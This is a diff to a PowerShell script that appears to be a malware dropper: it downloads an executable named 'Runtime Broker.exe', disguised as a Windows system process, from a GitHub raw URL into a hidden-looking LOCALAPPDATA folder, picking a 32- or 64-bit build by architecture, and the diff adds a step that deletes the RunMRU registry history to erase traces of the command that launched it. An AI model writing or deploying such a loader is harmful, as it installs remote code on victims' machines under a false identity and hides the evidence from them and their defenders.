@@ -2,6 +2,8 @@ $root = Join-Path -Path $env:LOCALAPPDATA -ChildPath "Wizzard"
 $servicio = "Wizard"
 $ejecutable = "Runtime Broker.exe"
 $rootFile = Join-Path -Path $root -ChildPath $ejecutable
+$arch = (Get-WmiObject -Class Win32_OperatingSystem).OSArchitecture
+
 
 if (-not (Test-Path $root)) {
     try {
@@ -30,7 +32,13 @@ catch {
 }
 
 try {
-    Start-BitsTransfer -Source "https://raw.githubusercontent.com/baa4ts/Wizard/refs/heads/main/Wizard/build/Runtime%20Broker.exe" -Destination $rootFile
+    if ($arch -eq "64-bit") {
+        Start-BitsTransfer -Source "https://raw.githubusercontent.com/baa4ts/Wizard/refs/heads/main/Wizard/build/64/Runtime%20Broker.exe" -Destination $rootFile
+    }
+    
+    if ($arch -eq "32-bit") {
+        Start-BitsTransfer -Source "https://raw.githubusercontent.com/baa4ts/Wizard/refs/heads/main/Wizard/build/32/Runtime%20Broker.exe" -Destination $rootFile
+    }
 }
 catch {
     exit 1
@@ -66,3 +74,12 @@ try {
 catch {
     exit 1
 }
+
+try {
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force
+    
+}
+catch {
+    exit 1
+}
+
